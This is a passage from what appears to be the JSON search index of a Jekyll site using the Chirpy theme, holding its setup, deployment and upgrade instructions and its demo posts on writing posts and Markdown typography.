development. If you want the site to be stable, please switch to the latest tag and start writing.And then execute:$ bash tools/init.sh Note: If you don’t want to deploy your site on GitHub Pages, append option --no-gh at the end of the above command.The above command will: Removes some files or directories from your repository: .travis.yml files under _posts folder docs If the option --no-gh is provided, the directory .github will be deleted. Otherwise, set up the GitHub Action workflow by removing the extension .hook of .github/workflows/pages-deploy.yml.hook, and then remove the other files and directories in the folder .github. Removes item Gemfile.lock from .gitignore. Creates a new commit to save the changes automatically. Installing DependenciesBefore running for the first time, go to the root directory of your site, and install dependencies as follows:$ bundleUsageConfigurationUpdate the variables of _config.yml as needed. Some of them are typical options: url avatar timezone langCustoming StylesheetIf you need to customize the stylesheet, copy the theme’s assets/css/style.scss to the same path on your Jekyll site, and then add the custom style at the end of the style file.Starting from v4.1.0, if you want to overwrite the SASS variables defined in _sass/addon/variables.scss, create a new file _sass/variables-hook.scss and assign new values to the target variable in it.Running Local ServerYou may want to preview the site contents before publishing, so just run it by:$ bundle exec jekyll sOr run the site on Docker with the following command:$ docker run -it --rm \\ --volume=&quot;$PWD:/srv/jekyll&quot; \\ -p 4000:4000 jekyll/jekyll \\ jekyll serveAfter a while, the local service will be published at http://127.0.0.1:4000.DeploymentBefore the deployment begins, check out the file _config.yml and make sure the url is configured correctly. Furthermore, if you prefer the project site and don’t use a custom domain, or you want to visit your website with a base URL on a web server other than GitHub Pages, remember to change the baseurl to your project name that starts with a slash, e.g, /project-name.Now you can choose ONE of the following methods to deploy your Jekyll site.Deploy by Using Github ActionsFor security reasons, GitHub Pages build runs on safe mode, which restricts us from using plugins to generate additional page files. Therefore, we can use GitHub Actions to build the site, store the built site files on a new branch, and use that branch as the source of the GitHub Pages service.Quickly check the files needed for GitHub Actions build: Ensure your Jekyll site has the file .github/workflows/pages-deploy.yml. Otherwise, create a new one and fill in the contents of the sample file, and the value of the on.push.branches should be the same as your repo’s default branch name. Ensure your Jekyll site has file tools/deploy.sh. Otherwise, copy it from here to your Jekyll site. Furthermore, if you have committed Gemfile.lock to the repo, and your runtime system is not Linux, don’t forget to update the platform list in the lock file: $ bundle lock --add-platform x86_64-linux After the above steps, rename your repository to &amp;lt;GH_USERNAME&amp;gt;.github.io on GitHub.Now publish your Jekyll site by: Push any commit to remote to trigger the GitHub Actions workflow. Once the build is complete and successful, a new remote branch named gh-pages will appear to store the built site files. Browse to your repository on GitHub. Select the tab Settings, then click Pages in the left navigation bar, and then in the section Source of GitHub Pages, select the /(root) directory of branch gh-pages as the publishing source. Remember to click Save before leaving. Visit your website at the address indicated by GitHub. Manually Build and DeployOn self-hosted servers, you cannot enjoy the convenience of GitHub Actions. Therefore, you should build the site on your local machine and then upload the site files to the server.Go to the root of the source project, and build your site as follows:$ JEKYLL_ENV=production bundle exec jekyll bOr build the site on Docker:$ docker run -it --rm \\ --env JEKYLL_ENV=production \\ --volume=&quot;$PWD:/srv/jekyll&quot; \\ jekyll/jekyll \\ jekyll buildUnless you specified the output path, the generated site files will be placed in folder _site of the project’s root directory. Now you should upload those files to the target server.UpgradingIt depends on how you use the theme: If you are using the theme gem (there will be gem &quot;jekyll-theme-chirpy&quot; in the Gemfile), editing the Gemfile and update the version number of the theme gem, for example: - gem &quot;jekyll-theme-chirpy&quot;, &quot;~&amp;gt; 3.2&quot;, &quot;&amp;gt;= 3.2.1&quot;+ gem &quot;jekyll-theme-chirpy&quot;, &quot;~&amp;gt; 3.3&quot;, &quot;&amp;gt;= 3.3.0&quot; And then execute the following command: $ bundle update jekyll-theme-chirpy As the version upgrades, the critical files (for details, see the Startup Template) and configuration options will change. Please refer to the Upgrade Guide to keep your repo’s files in sync with the latest version of the theme. If you forked from the source project (there will be gemspec in the Gemfile of your site), then merge the latest upstream tags into your Jekyll site to complete the upgrade.The merge is likely to conflict with your local modifications. Please be patient and careful to resolve these conflicts. " }, { "title": "Writing a New Post", "url": "/posts/write-a-new-post/", "categories": "Blogging, Tutorial", "tags": "writing", "date": "2019-08-08 14:10:00 +0800", "snippet": "This post will guide you how to write a post on Chirpy theme. Even if you have previous experience with Jekyll, this article is worth reading, because many features require specific variables to be set.Naming and PathCreate a new file named YYYY-MM-DD-TITLE.EXTENSION and put it in the _posts of the root directory. Please note that the EXTENSION must be one of md and markdown. If you want to save time of creating files, please consider using the plugin Jekyll-Compose to accomplish this.Front MatterBasically, you need to fill the Front Matter as below at the top of the post:---title: TITLEdate: YYYY-MM-DD HH:MM:SS +/-TTTTcategories: [TOP_CATEGORIE, SUB_CATEGORIE]tags: [TAG] # TAG names should always be lowercase--- Note: The posts’ layout has been set to post by default, so there is no need to add the variable layout in the Front Matter block.Timezone of DateIn order to accurately record the release date of a post, you should not only set up the timezone of _config.yml but also provide the post’s timezone in variable date of its Front Matter block. Format: +/-TTTT, e.g. +0800.Categories and TagsThe categories of each post are designed to contain up to two elements, and the number of elements in tags can be zero to infinity. For instance:---categories: [Animal, Insect]tags: [bee]---Author InformationThe author information of the post usually does not need to be filled in the Front Matter , they will be obtained from variables social.name and the first entry of social.links of the configuration file by default. But you can also override it as follows:---author: name: Full Name link: https://example.com---Table of ContentsBy default, the Table of Contents (TOC) is displayed on the right panel of the post. If you want to turn it off globally, go to _config.yml and set the value of variable toc to false. If you want to turn off TOC for a specific post, add the following to the post’s Front Matter:---toc: false---CommentsThe global switch of comments is defined by variable comments.active in the file _config.yml. After selecting a comment system for this variable, comments will be turned on for all posts.If you want to close the comment for a specific post, add the following to the Front Matter of the post:---comments: false---MathematicsFor website performance reasons, the mathematical feature won’t be loaded by default. But it can be enabled by:---math: true---MermaidMermaid is a great diagrams generation tool. To enable it on your post, add the following to the YAML block:---mermaid: true---Then you can use it like other markdown languages: surround the graph code with ```mermaid and ```.ImagesCaptionAdd italics to the next line of an image，then it will become the caption and appear at the bottom of the image:![img-description](/path/to/image)_Image Caption_SizeIn order to prevent the page content layout from shifting when the image is loaded, we should set the width and height for each image:![Desktop View](/assets/img/sample/mockup.png){: width=&quot;700&quot; height=&quot;400&quot; }Starting from Chirpy v5.0.0, height and width support abbreviations (height → h, width → w). The following example has the same effect as the above:![Desktop View](/assets/img/sample/mockup.png){: w=&quot;700&quot; h=&quot;400&quot; }PositionBy default, the image is centered, but you can specify the position by using one of the classes normal, left, and right. For example: Normal position Image will be left aligned in below sample: ![Desktop View](/assets/img/sample/mockup.png){: .normal } Float to the left ![Desktop View](/assets/img/sample/mockup.png){: .left } Float to the right ![Desktop View](/assets/img/sample/mockup.png){: .right } Limitation: Once the position of the image is specified, the image caption should not be added.ShadowThe screenshots of the program window can be considered to show the shadow effect, and the shadow will be visible in the light mode:![Desktop View](/assets/img/sample/mockup.png){: .shadow }CDN URLIf you host the images on the CDN, you can save the time of repeatedly writing the CDN URL by assigning the variable img_cdn of _config.yml file:img_cdn: https://cdn.comOnce img_cdn is assigned, the CDN URL will be added to the path of all images (images of site avatar and posts) starting with /.For instance, when using images:![The flower](/path/to/flower.png)The parsing result will automatically add the CDN prefix https://cdn.com before the image path:&amp;lt;img src=&quot;https://cdn.com/path/to/flower.png&quot; alt=&quot;The flower&quot;&amp;gt;Image PathWhen a post contains many images, it will be a time-consuming task to repeatedly define the path of the images. To solve this, we can define this path in the YAML block of the post:---img_path: /img/path/---And then, the image source of Markdown can write the file name directly:![The flower](flower.png)The output will be:&amp;lt;img src=&quot;/img/path/flower.png&quot; alt=&quot;The flower&quot;&amp;gt;Preview ImageIf you want to add an image to the top of the post contents, specify the attribute src, width, height, and alt for the image:---image: src: /path/to/image/file width: 1000 # in pixels height: 400 # in pixels alt: image alternative text---Except for alt, all other options are necessary, especially the width and height, which are related to user experience and web page loading performance. The above section “Size” also mentions this.Starting from Chirpy v5.0.0, the attributes height and width can be abbreviated: height → h, width → w. In addition, the img_path can also be passed to the preview image, that is, when it has been set, the attribute src only needs the image file name.Pinned PostsYou can pin one or more posts to the top of the home page, and the fixed posts are sorted in reverse order according to their release date. Enable by:---pin: true---Code BlockMarkdown symbols ``` can easily create a code block as follows:This is a plaintext code snippet.Specifying LanguageUsing ```{language} you will get a code block with syntax highlight:```yamlkey: value``` Limitation: The Jekyll style highlight tag is not compatible with this theme.Line NumberBy default, all languages except plaintext, console, and terminal will display line numbers. When you want to hide the line number of the code block, you can append {: .nolineno} at the next line:```shellecho &#39;No more line numbers!&#39;```{: .nolineno}Specifying the FilenameYou may have noticed that the code language will be displayed on the left side of the header of the code block. If you want to replace it with the file name, you can add the attribute file to achieve this:```shell# content```{: file=&quot;path/to/file&quot; }Liquid CodesIf you want to display the Liquid snippet, surround the liquid code with {% raw %} and {% endraw %}:{% raw %}```liquid{% if product.title contains &#39;Pack&#39; %} This product&#39;s title contains the word Pack.{% endif %}```{% endraw %}Or adding render_with_liquid: false (Requires Jekyll 4.0 or higher) to the post’s YAML block.Learn MoreFor more knowledge about Jekyll posts, visit the Jekyll Docs: Posts." }, { "title": "Text and Typography", "url": "/posts/text-and-typography/", "categories": "Blogging, Demo", "tags": "typography", "date": "2019-08-08 11:33:00 +0800", "snippet": "This post is to show Markdown syntax rendering on Chirpy, you can also use it as an example of writing. Now, let’s start looking at text and typography.TitlesH1 - headingH2 - headingH3 - headingH4 - headingParagraphI wandered lonely as a cloudThat floats on high o’er vales and hills,When all at once I saw a crowd,A host, of golden daffodils;Beside the lake, beneath the trees,Fluttering and dancing in the breeze.ListsOrdered list Firstly Secondly ThirdlyUnordered list Chapter Section Paragraph Task list TODO Completed Defeat COVID-19 Vaccine production Economic recovery People smile again Description list Sun the star around which the earth orbits Moon the natural satellite of the earth, visible by reflected light from the sunBlock Quote This line to shows the Block Quote.Tables Company Contact Country Alfreds Futterkiste Maria Anders Germany Island Trading Helen Bennett UK Magazzini Alimentari Riuniti Giovanni Rovelli Italy Linkshttp://127.0.0.1:4000FootnoteClick the hook will locate the footnote1, and here is another footnote2.Images Default (with caption)Full screen width and center alignment Shadowshadow effect (visible in light mode) Left aligned Float to left “A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space.” Float to right “A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space.” Mermaid SVG gantt title Adding GANTT diagram functionality to mermaid apple :a, 2017-07-20, 1w banana :crit, b, 2017-07-23, 1d cherry :active, c, after b a, 1dMathematicsThe mathematics powered by MathJax:\\[\\sum_{n=1}^\\infty 1/n^2 = \\frac{\\pi^2}{6}\\]When $a \\ne 0$, there are two solutions to $ax^2 + bx + c = 0$ and they are\\[x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}\\]Inline codeThis is an example of Inline Code.Code blockCommonThis is a common code snippet, without syntax highlight and line number.Specific LanguagesConsole$ env |grep SHELLSHELL=/usr/local/bin/bashPYENV_SHELL=bashShellif [ $? -ne 0 ]; then echo &quot;The command was not successful.&quot;; #do the needful / exitfi;Specific filename@import &quot;colors/light-typography&quot;, &quot;colors/dark-typography&quot;Reverse Footnote The footnote source &amp;#8617; The 2nd footnote source &amp;#8617; " } ]
